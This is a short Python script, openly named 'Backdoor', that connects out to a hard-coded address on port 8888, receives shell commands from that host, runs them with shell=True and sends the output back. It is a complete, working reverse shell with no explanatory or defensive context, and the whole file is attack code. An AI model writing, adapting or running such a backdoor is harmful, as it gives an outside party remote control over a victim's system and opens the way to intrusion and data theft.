#!/usr/bin/env python

import socket
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = execute_system_command(command)
            self.connection.send(command_result)
        self.connection.close()


my_backdoor = Backdoor("192.168.225.179", 8888)
my_backdoor.run()